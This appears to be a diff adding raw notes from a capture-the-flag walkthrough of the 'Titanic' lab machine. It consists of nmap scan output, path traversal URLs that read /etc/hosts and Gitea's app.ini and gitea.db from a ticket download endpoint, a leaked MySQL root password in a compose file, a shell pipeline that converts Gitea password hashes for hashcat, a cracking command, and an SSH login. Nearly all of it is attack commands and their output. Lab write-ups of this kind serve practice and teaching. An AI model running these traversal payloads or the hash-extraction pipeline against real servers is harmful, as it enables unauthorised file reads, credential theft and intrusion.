@@ -1,0 +1,44 @@
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 73039c76eb04f1fec9e980449c7f1346 (ECDSA)
+|_  256 d5bd1d5e9a861ceb88634d5f884b7e04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://titanic.htb/
+Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+http://titanic.htb//download?ticket=../../../../../../../../../../../../../etc/hosts
+
+127.0.0.1 localhost titanic.htb dev.titanic.htb
+
+version: '3.8'
+
+services:
+  mysql:
+    image: mysql:8.0
+    container_name: mysql
+    ports:
+      - "127.0.0.1:3306:3306"
+    environment:
+      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
+      MYSQL_DATABASE: tickets 
+      MYSQL_USER: sql_svc
+      MYSQL_PASSWORD: sql_password
+    restart: always
+
+
+http://titanic.htb//download?ticket=../../../../../../../../../../../../../../../../home/developer/gitea/data/gitea/conf/app.ini
+
+http://titanic.htb//download?ticket=../../../../../../../../../../../../../../../../home/developer/gitea/data/gitea/gitea.db
+
+
+sqlite3 gitea.db 
+sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
+
+└─$ hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user --show
+
+25282528
+ssh developer@10.10.11.55
+
